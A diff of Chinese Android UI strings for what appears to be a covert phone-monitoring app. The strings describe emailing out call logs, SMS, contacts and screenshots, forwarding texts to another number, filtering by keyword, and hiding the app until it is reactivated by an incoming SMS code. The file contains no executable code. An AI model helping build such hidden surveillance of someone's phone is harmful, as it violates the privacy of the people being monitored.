@@ -7,7 +7,7 @@
     <string name="sms_sent">发信</string>
     <string name="sms_unknown">未知</string>
     <string name="sms_name">短信</string>
-    <string name="sms_redirect_header">【转发】</string>
+    <string name="sms_redirect_header">【来自%s】</string>
     
     <!-- Contact -->
     <string name="contact_name">联系人</string>
@@ -42,19 +42,20 @@
     <string name="pref_phonenum_title">接收手机的号码</string>
     <string name="pref_pls_input_phonenum">请输入接收手机号。</string>
     <string name="pref_word_sensor_key">pref_word_sensor</string>
-    <string name="pref_word_sensor_title">敏感词</string>
-    <string name="pref_word_sensor_summary">空格隔开，最多9个。</string>
-    <string name="pref_pls_input_sensitive_words">请输入敏感词（用空格隔开）</string>
+    <string name="pref_word_sensor_title">敏感词（空格隔开）</string>
+    <string name="pref_word_sensor_summary">请用空格隔开每个敏感词，最多支持9个。</string>
+    <string name="pref_pls_input_sensitive_words">请输入敏感词，并用空格隔开，最多支持9个。</string>
+    <string name="pref_sensitive_words_count_reach_max">最多只能支持%d个敏感词，多余的将被忽略。请您重新编辑敏感词。</string>
     
     <!-- InitActivity -->
     <string name="init_btn_getinfo">立即获取信息</string>
     <string name="init_btn_screenshot">截图</string>
     <string name="init_btn_setting">设定</string>
     <string name="init_btn_hide">退出</string>
-	<string name="init_hint_getinfo">获得当前手机的通话记录，短信和联系人信息，并发送至邮箱</string>
+	<string name="init_hint_getinfo">立即获得当前手机的所有通话记录，短信和联系人信息，并发送至邮箱。</string>
     <string name="init_hint_screenshot">获得当前手机截屏并发送至信箱</string>
-    <string name="init_hint_setting">设置邮箱及监控时间间隔</string>
-    <string name="init_hint_hide">退出当前对话框</string>
+    <string name="init_hint_setting">设置邮箱，监控时间间隔，接收转送短信的手机号码，敏感词。</string>
+    <string name="init_hint_hide">退出当前对话框。发送短信（内容为注册码）到本机，方可再次激活本对话框。</string>
     
     <!-- Actions -->
     <string name="action_send_mail_success">发信成功。稍后请查阅您的邮箱。</string>
@@ -62,5 +63,6 @@
     
     <!-- Message -->
 	<string name="msg_invalid_key">无效的注册码。可能已被使用。请联系您的软件提供商。</string>
+	<string name="msg_cannot_write_license_to_sharedpreferences">错误：注册信息不能写入SharedPreferences。</string>
     
 </resources>
